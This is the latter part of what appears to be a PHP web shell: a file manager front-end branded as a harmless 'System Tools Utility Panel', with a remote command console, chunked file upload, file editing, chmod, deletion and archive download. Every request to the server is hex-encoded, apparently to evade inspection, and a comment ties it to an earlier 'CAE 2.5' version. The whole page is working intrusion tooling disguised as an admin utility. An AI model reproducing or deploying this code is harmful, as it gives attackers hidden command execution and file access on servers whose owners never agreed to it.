.modal-header{padding:18px 24px;border-bottom:1px solid var(--fm-border-color);display:flex;align-items:center;justify-content:space-between}.stealth-fm .modal-title{font-weight:600}.stealth-fm .modal-close{width:32px;height:32px;display:flex;align-items:center;justify-content:center;border-radius:var(--fm-radius-sm);cursor:pointer;color:var(--fm-text-muted)}.stealth-fm .modal-close:hover{background-color:var(--fm-hover-bg);color:var(--fm-text-primary)}.stealth-fm .modal-body{padding:20px 24px 24px}.stealth-fm .chmod-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin:20px 24px 0 24px}.stealth-fm .chmod-group{background-color:var(--fm-bg-main);border:1px solid var(--fm-border-color);border-radius:var(--fm-radius-md);padding:14px 8px;text-align:center}.stealth-fm .chmod-group-label{font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.05em;color:var(--fm-text-muted);margin-bottom:10px}.stealth-fm .chmod-checkboxes{display:flex;justify-content:center;gap:6px}.stealth-fm .chmod-checkboxes label{font-size:11px;cursor:pointer;display:flex;align-items:center;gap:2px}#fm-loading-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.4);z-index:999;align-items:center;justify-content:center;color:#fff;font-weight:600;font-family:var(--fm-font-stack);backdrop-filter:blur(2px)}#fm-loading-overlay.show{display:flex}@media (max-width:768px){.stealth-fm .file-table th:nth-child(3),.stealth-fm .file-table td:nth-child(3),.stealth-fm .file-table th:nth-child(4),.stealth-fm .file-table td:nth-child(4),.stealth-fm .file-table th:nth-child(5),.stealth-fm .file-table td:nth-child(5),.stealth-fm .file-table th:nth-child(6),.stealth-fm .file-table td:nth-child(6){display:none}.stealth-fm .input-group{flex-direction:column}}
</style>
</head>
<body>
<div class="stealth-fm">
<div class="container">
<div class="header">
<div class="header-top">
<div class="logo"><span class="logo-text">System <span>Tools</span></span><span class="logo-sub">Utility Panel</span></div>
<button class="theme-toggle" onclick="toggleTheme()">Toggle Light Mode</button>
</div>
</div>

<?php if ($errorMsg): ?><div class="alert alert-danger"><?= htmlentities($errorMsg) ?></div><?php endif; ?>

<!-- Navigation -->
<div class="card"><div class="card-header"><span class="card-title">Navigate</span></div>
<div class="card-body"><form onsubmit="doNavigateHex(event)" class="input-group">
<input type="text" id="goto_path_input" name="goto_path" value="<?= htmlentities($currentDirectory) ?>" style="flex:1;">
<button class="btn btn-primary" type="submit">Go</button>
</form></div></div>

<!-- Upload & Create -->
<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:16px;margin-bottom:24px;">
<div class="card" style="margin-bottom:0;"><div class="card-header"><span class="card-title">Upload</span></div>
<div class="card-body">
<div class="input-group">
<select id="upload_mode"><option value="1">Mode 1 (file_put_contents)</option><option value="2">Mode 2 (fopen+flock)</option><option value="3">Mode 3 (data://)</option></select>
<input type="file" id="upload_files" style="flex:1;">
</div>
<div style="margin-top:12px;"><button class="btn btn-primary" onclick="doUploadFileHex(this)">Upload</button><span id="upload_status" class="file-meta" style="margin-left:12px;"></span></div>
</div></div>
<div class="card" style="margin-bottom:0;"><div class="card-header"><span class="card-title">Create</span></div>
<div class="card-body">
<form onsubmit="doCreateItemHex(event, 'file')" class="input-group"><input type="text" name="mk_file" placeholder="File name..." style="flex:1;"><button class="btn btn-success" type="submit">File</button></form>
<form onsubmit="doCreateItemHex(event, 'folder')" class="input-group" style="margin-top:12px;"><input type="text" name="mk_folder" placeholder="Folder name..." style="flex:1;"><button class="btn btn-success" type="submit">Folder</button></form>
</div></div>
</div>

<!-- Viewer & Editor -->
<div class="card" id="viewerCard" style="display:none;"><div class="card-header"><span class="card-title">Viewing: <span id="viewTitleName"></span></span><button class="btn btn-ghost btn-sm" onclick="document.getElementById('viewerCard').style.display='none';">Close</button></div><div class="card-body"><textarea id="viewContentArea" readonly style="min-height:300px;"></textarea></div></div>
<div class="card" id="editorCard" style="display:none;"><div class="card-header"><span class="card-title">Editing: <span id="editTitleName"></span></span></div><div class="card-body"><form onsubmit="doSaveEditHex(event)"><input type="hidden" id="editFileName"><textarea id="editContentArea" style="min-height:400px;"></textarea><div style="margin-top:16px;display:flex;gap:8px;"><button class="btn btn-primary" type="submit">Save</button><button class="btn btn-ghost" onclick="document.getElementById('editorCard').style.display='none';">Cancel</button></div></form></div></div>

<!-- Console -->
<?php if ($commandAvailable): ?>
<div class="card"><div class="card-header"><span class="card-title">Console</span></div>
<div class="card-body"><form id="consoleForm" onsubmit="submitConsoleHex(event)" class="input-group"><input type="text" id="exec_cmd_input" placeholder="Enter command..." style="flex:1;"><button class="btn btn-primary" type="submit">Execute</button></form><div id="consoleResultOutput" class="console" style="margin-top:16px;display:none;"></div></div></div>
<?php endif; ?>

<!-- Bulk actions -->
<div class="bulk-bar" id="bulk-actions"><span class="bulk-count" id="selected-count">0 selected</span><button class="btn btn-ghost" onclick="doBulkDownloadHex()">Download Archive</button><button class="btn btn-danger" onclick="doBulkDeleteHex()">Delete Selected</button></div>

<!-- File table -->
<div class="card"><div class="card-header"><span class="card-title">Directory</span><button class="btn btn-ghost btn-sm" onclick="sendHexPayload({action:'goto', goto_hex:stringToHex('<?= addslashes(dirname($currentDirectory)) ?>')}).then(()=>location.reload());">Parent</button></div>
<div style="overflow-x:auto;"><table class="file-table"><thead><tr><th style="width:40px;"><input type="checkbox" onclick="toggleSelectAll(this)"></th><th>Name</th><th style="width:100px;">Type</th><th style="width:100px;text-align:right;">Size</th><th style="width:150px;">Modified</th><th style="width:90px;text-align:center;">Perms</th><th style="width:250px;text-align:right;">Actions</th></tr></thead>
<tbody>
<?php foreach ($allItems as $item):
$name = htmlentities($item['name']);
$fullPath = $currentDirectory . DIRECTORY_SEPARATOR . $item['name'];
$isDirectory = $item['is_dir'];
$fileSize = $item['size'];
$fileModTime = $item['mtime'];
$filePerms = $item['perms'];
$canWrite = $item['writable'];
$md5item = md5($item['name']);
$ext = strtolower(pathinfo($item['name'], PATHINFO_EXTENSION));
$iconHtml = $isDirectory ? '<svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>' : '<svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>';
if (!$isDirectory && $ext) $iconHtml .= '<span class="ext">'.strtoupper($ext).'</span>';
?>
<tr><td><input type="checkbox" name="items[]" value="<?= $name ?>" onclick="updateBulkActions()"></td>
<td><div id="row-normal-<?= $name ?>" class="file-name-cell"><div class="file-icon"><?= $iconHtml ?></div><?php if ($isDirectory): ?><a href="#" class="file-name" onclick="sendHexPayload({action:'goto', goto_hex:stringToHex('<?= addslashes($fullPath) ?>')}).then(()=>location.reload()); return false;"><?= $name ?></a><?php else: ?><a href="#" class="file-name" onclick="openViewerHex('<?= addslashes($item['name']) ?>'); return false;"><?= $name ?></a><?php endif; ?></div><div id="row-rename-<?= $name ?>" style="display:none;gap:8px;align-items:center;"><input type="text" id="rename_input_<?= $name ?>" value="<?= $name ?>" style="flex:1;"><button class="btn btn-primary btn-sm" onclick="doRenameHex('<?= addslashes($item['name']) ?>')">Save</button><button class="btn btn-ghost btn-sm" onclick="cancelRenameInput('<?= addslashes($item['name']) ?>')">Cancel</button></div></td>
<td><span class="file-meta"><?= $isDirectory ? 'Directory' : (getFileExtension($item['name']) ?: 'File') ?></span></td>
<td style="text-align:right;"><span class="file-meta"><?= $isDirectory ? '&mdash;' : formatFileSize($fileSize) ?></span></td>
<td><span class="file-meta"><?= $fileModTime ? date('Y-m-d H:i', $fileModTime) : '-' ?></span></td>
<td style="text-align:center;"><span class="perms <?= $canWrite ? 'writable' : 'readonly' ?>"><?= htmlentities($filePerms) ?></span><input type="hidden" id="currentPerms_<?= $md5item ?>" value="<?= htmlentities($filePerms) ?>"></td>
<td><div class="actions"><?php if (!$isDirectory): ?><button class="btn btn-ghost btn-sm" onclick="openEditorHex('<?= addslashes($item['name']) ?>')">Edit</button><?php endif; ?><button class="btn btn-ghost btn-sm" onclick="openRenameInput('<?= addslashes($item['name']) ?>')">Rename</button><button class="btn btn-ghost btn-sm" onclick="openChmodModal('<?= $name ?>', 'currentPerms_<?= $md5item ?>')">Chmod</button><button class="btn btn-ghost btn-sm" onclick="doDownloadHex('<?= addslashes($item['name']) ?>')">DL</button><button class="btn btn-danger btn-sm" onclick="doDeleteHex('<?= addslashes($item['name']) ?>')">Del</button></div></td></tr>
<?php endforeach; ?>
</tbody></table></div></div>
</div>

<!-- Chmod Modal -->
<div id="chmodModal" class="modal"><div class="modal-content"><div class="modal-header"><span class="modal-title">Change Permissions</span><span class="modal-close" onclick="closeChmodModal()"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg></span></div><form onsubmit="doChmodHex(event)"><input type="hidden" id="chmodItem"><div class="chmod-grid"><div class="chmod-group"><div class="chmod-group-label">Owner</div><div class="chmod-checkboxes"><label><input type="checkbox" id="owner_read" onchange="updateChmodFromCheckboxes()"> R</label><label><input type="checkbox" id="owner_write" onchange="updateChmodFromCheckboxes()"> W</label><label><input type="checkbox" id="owner_execute" onchange="updateChmodFromCheckboxes()"> X</label></div></div><div class="chmod-group"><div class="chmod-group-label">Group</div><div class="chmod-checkboxes"><label><input type="checkbox" id="group_read" onchange="updateChmodFromCheckboxes()"> R</label><label><input type="checkbox" id="group_write" onchange="updateChmodFromCheckboxes()"> W</label><label><input type="checkbox" id="group_execute" onchange="updateChmodFromCheckboxes()"> X</label></div></div><div class="chmod-group"><div class="chmod-group-label">Other</div><div class="chmod-checkboxes"><label><input type="checkbox" id="other_read" onchange="updateChmodFromCheckboxes()"> R</label><label><input type="checkbox" id="other_write" onchange="updateChmodFromCheckboxes()"> W</label><label><input type="checkbox" id="other_execute" onchange="updateChmodFromCheckboxes()"> X</label></div></div></div><div class="modal-body"><div style="margin-bottom:20px;text-align:center;"><input type="text" id="chmodOctal" maxlength="3" style="width:80px;text-align:center;font-family:var(--fm-font-mono);font-size:16px;"></div><div style="display:flex;gap:12px;justify-content:center;"><button type="button" class="btn btn-ghost" onclick="closeChmodModal()">Cancel</button><button type="submit" class="btn btn-primary">Apply</button></div></div></form></div></div>
</div>

<div id="fm-loading-overlay"></div>

<script>
// Same JavaScript as original CAE 2.5, only minimal changes (function names unchanged)
(function(){ const saved = localStorage.getItem('fm_theme'); if(saved==='light'){ document.documentElement.style.visibility='hidden'; window.addEventListener('DOMContentLoaded',()=>{ document.querySelector('.stealth-fm').classList.add('light'); document.documentElement.style.visibility='visible'; }); } })();
function toggleTheme(){ const fm = document.querySelector('.stealth-fm'); fm.classList.toggle('light'); localStorage.setItem('fm_theme', fm.classList.contains('light') ? 'light' : 'dark'); }
function stringToHex(str){ let h=''; for(let i=0;i<str.length;i++){ let c=str.charCodeAt(i).toString(16); h += c.length<2?'0'+c:c; } return h; }
function bufferToHex(buf){ let arr=new Uint8Array(buf); let h=''; for(let i=0;i<arr.length;i++) h += arr[i].toString(16).padStart(2,'0'); return h; }
function hexToUtf8(hex){ try{ let bytes=new Uint8Array(hex.match(/.{1,2}/g).map(b=>parseInt(b,16))); return new TextDecoder().decode(bytes); }catch(e){ let s=''; for(let i=0;i<hex.length;i+=2) s += String.fromCharCode(parseInt(hex.substr(i,2),16)); return decodeURIComponent(escape(s)); } }
function getCsrfToken(){ return document.querySelector('meta[name="csrf-token"]').content; }
let isRequestInProgress=false;
function showLoading(t='Processing...'){ let o=document.getElementById('fm-loading-overlay'); if(!o){ o=document.createElement('div'); o.id='fm-loading-overlay'; document.body.appendChild(o); } o.textContent=t; o.classList.add('show'); }
function hideLoading(){ let o=document.getElementById('fm-loading-overlay'); if(o) o.classList.remove('show'); }
async function sendHexPayload(payload, statusSpan=null){ if(isRequestInProgress) return; isRequestInProgress=true; payload._csrf_token=getCsrfToken(); try{ const res=await fetch(window.location.href,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}); const text=await res.text(); let data; try{ data=JSON.parse(text); }catch(e){ throw new Error(text||'Invalid response'); } if(!res.ok) throw new Error(data.message||'Server error'); return data; }catch(err){ hideLoading(); if(statusSpan){ statusSpan.textContent='Error: '+err.message; statusSpan.style.color='var(--fm-danger)'; } else alert('Request failed: '+err.message); throw err; }finally{ isRequestInProgress=false; } }
async function doNavigateHex(event){ event.preventDefault(); const path=document.getElementById('goto_path_input').value.trim(); if(!path) return; showLoading('Switching directory...'); try{ await sendHexPayload({action:'goto', goto_hex:stringToHex(path)}); location.reload(); }catch(e){ hideLoading(); } }
async function doUploadFileHex(btn){ const fileInput=document.getElementById('upload_files'); const modeInput=document.getElementById('upload_mode'); const statusSpan=document.getElementById('upload_status'); if(!fileInput.files.length){ statusSpan.textContent="No file selected"; statusSpan.style.color="var(--fm-danger)"; return; } btn.disabled=true; const file=fileInput.files[0]; const mode=modeInput.value; showLoading("Uploading..."); const chunkSize=512*1024; const totalChunks=Math.ceil(file.size/chunkSize); try{ for(let i=0;i<totalChunks;i++){ const start=i*chunkSize; const end=Math.min(file.size,start+chunkSize); const chunk=file.slice(start,end); statusSpan.textContent=`Chunk ${i+1}/${totalChunks}...`; await new Promise((resolve,reject)=>{ const reader=new FileReader(); reader.onload=async function(e){ try{ await sendHexPayload({ action:'upload_hex', name_hex:stringToHex(file.name), data_hex:bufferToHex(e.target.result), mode:mode, append:i>0?1:0 }, statusSpan); resolve(); }catch(err){ reject(err); } }; reader.readAsArrayBuffer(chunk); }); } statusSpan.textContent="Upload complete!"; statusSpan.style.color='var(--fm-success)'; hideLoading(); setTimeout(()=>location.reload(),800); }catch(err){ btn.disabled=false; hideLoading(); } }
async function doCreateItemHex(event,type){ event.preventDefault(); const name=event.target.elements[type==='file'?'mk_file':'mk_folder'].value.trim(); if(!name) return; showLoading(type==='file'?'Creating file...':'Creating folder...'); try{ await sendHexPayload({ action:type==='file'?'create_file':'create_folder', name_hex:stringToHex(name) }); location.reload(); }catch(e){ hideLoading(); } }
async function openEditorHex(itemName){ showLoading('Loading...'); try{ const data=await sendHexPayload({ action:'get_file_content', file_hex:stringToHex(itemName) }); document.getElementById('editFileName').value=itemName; document.getElementById('editTitleName').textContent=itemName; document.getElementById('editContentArea').value=hexToUtf8(data.content_hex); document.getElementById('editorCard').style.display='block'; document.getElementById('viewerCard').style.display='none'; hideLoading(); window.scrollTo({top:document.getElementById('editorCard').offsetTop,behavior:'smooth'}); }catch(e){ hideLoading(); } }
async function doSaveEditHex(event){ event.preventDefault(); const fileName=document.getElementById('editFileName').value; const content=document.getElementById('editContentArea').value; showLoading('Saving...'); try{ await sendHexPayload({ action:'edit_file', file_hex:stringToHex(fileName), content_hex:stringToHex(content) }); hideLoading(); alert('Saved!'); location.reload(); }catch(e){ hideLoading(); } }
async function openViewerHex(itemName){ showLoading('Reading...'); try{ const data=await sendHexPayload({ action:'get_file_content', file_hex:stringToHex(itemName) }); document.getElementById('viewTitleName').textContent=itemName; document.getElementById('viewContentArea').value=hexToUtf8(data.content_hex); document.getElementById('viewerCard').style.display='block'; document.getElementById('editorCard').style.display='none'; hideLoading(); window.scrollTo({top:document.getElementById('viewerCard').offsetTop,behavior:'smooth'}); }catch(e){ hideLoading(); } }
function openRenameInput(itemName){ document.getElementById('row-normal-'+itemName).style.display='none'; document.getElementById('row-rename-'+itemName).style.display='flex'; }
function cancelRenameInput(itemName){ document.getElementById('row-rename-'+itemName).style.display='none'; document.getElementById('row-normal-'+itemName).style.display='flex'; }
async function doRenameHex(itemName){ const newName=document.getElementById('rename_input_'+itemName).value.trim(); if(!newName || newName===itemName){ cancelRenameInput(itemName); return; } showLoading('Renaming...'); try{ await sendHexPayload({ action:'rename', old_hex:stringToHex(itemName), new_hex:stringToHex(newName) }); location.reload(); }catch(e){ hideLoading(); } }
async function doChmodHex(event){ event.preventDefault(); const itemName=document.getElementById('chmodItem').value; const permVal=document.getElementById('chmodOctal').value; showLoading('Updating permissions...'); try{ await sendHexPayload({ action:'chmod', item_hex:stringToHex(itemName), perm_val:permVal }); location.reload(); }catch(e){ hideLoading(); } }
async function doDeleteHex(itemName){ if(!confirm('Delete '+itemName+'?')) return; showLoading('Deleting...'); try{ await sendHexPayload({ action:'delete', item_hex:stringToHex(itemName) }); location.reload(); }catch(e){ hideLoading(); } }
async function doDownloadHex(itemName){ showLoading('Preparing...'); try{ const data=await sendHexPayload({ action:'download_hex', items:[stringToHex(itemName)] }); hideLoading(); if(data && data.data_hex) triggerHexDownload(data.data_hex, data.filename, data.mime); }catch(e){ hideLoading(); } }
async function doBulkDownloadHex(){ const checked=document.querySelectorAll('input[name="items[]"]:checked'); if(checked.length===0) return; const items=Array.from(checked).map(cb=>stringToHex(cb.value)); showLoading('Building archive...'); try{ const data=await sendHexPayload({ action:'download_hex', items:items }); hideLoading(); if(data && data.data_hex) triggerHexDownload(data.data_hex, data.filename, data.mime); }catch(e){ hideLoading(); } }
async function doBulkDeleteHex(){ const checked=document.querySelectorAll('input[name="items[]"]:checked'); if(checked.length===0) return; if(!confirm('Delete all selected items?')) return; showLoading('Deleting...'); try{ const items=Array.from(checked).map(cb=>stringToHex(cb.value)); await sendHexPayload({ action:'bulk_delete', items:items }); location.reload(); }catch(e){ hideLoading(); } }
async function submitConsoleHex(event){ event.preventDefault(); const cmd=document.getElementById('exec_cmd_input').value.trim(); if(!cmd) return; const out=document.getElementById('consoleResultOutput'); out.style.display='block'; out.textContent='Executing...'; try{ const data=await sendHexPayload({ action:'console_exec', exec_hex:stringToHex(cmd) }); if(data && data.output_hex) out.textContent=hexToUtf8(data.output_hex); }catch(err){ out.textContent='Error: '+err.message; } }
function triggerHexDownload(hexData, filename, mimeType){ let bytes=new Uint8Array(hexData.match(/.{1,2}/g).map(b=>parseInt(b,16))); let blob=new Blob([bytes], {type:mimeType}); let link=document.createElement('a'); link.href=window.URL.createObjectURL(blob); link.download=filename; document.body.appendChild(link); link.click(); document.body.removeChild(link); }
function toggleSelectAll(cb){ document.querySelectorAll('input[name="items[]"]').forEach(c=>c.checked=cb.checked); updateBulkActions(); }
function updateBulkActions(){ var checked=document.querySelectorAll('input[name="items[]"]:checked'); var bar=document.getElementById('bulk-actions'); var count=document.getElementById('selected-count'); if(checked.length>0){ bar.style.display='flex'; count.textContent=checked.length+' selected'; } else bar.style.display='none'; }
function openChmodModal(itemName, octalId){ var modal=document.getElementById('chmodModal'); modal.classList.add('show'); modal.style.display='flex'; document.getElementById('chmodItem').value=itemName; updateChmodDisplay(document.getElementById(octalId).value); }
function closeChmodModal(){ var modal=document.getElementById('chmodModal'); modal.classList.remove('show'); modal.style.display='none'; }
function updateChmodDisplay(perms){ perms=(perms||'0').toString().slice(-3); document.getElementById('chmodOctal').value=perms; var binary=(parseInt(perms,8)||0).toString(2); while(binary.length<9) binary='0'+binary; var ids=['owner_read','owner_write','owner_execute','group_read','group_write','group_execute','other_read','other_write','other_execute']; for(var i=0;i<9;i++) document.getElementById(ids[i]).checked=binary[i]==='1'; }
function updateChmodFromCheckboxes(){ var ids=['owner_read','owner_write','owner_execute','group_read','group_write','group_execute','other_read','other_write','other_execute']; var binary=''; for(var i=0;i<9;i++) binary += document.getElementById(ids[i]).checked?'1':'0'; var octal=parseInt(binary,2).toString(8); while(octal.length<3) octal='0'+octal; document.getElementById('chmodOctal').value=octal; }
function setPresetChmod(p){ updateChmodDisplay(p); }
window.onclick=function(e){ var modal=document.getElementById('chmodModal'); if(e.target==modal) closeChmodModal(); };
</script>
</body>
</html>
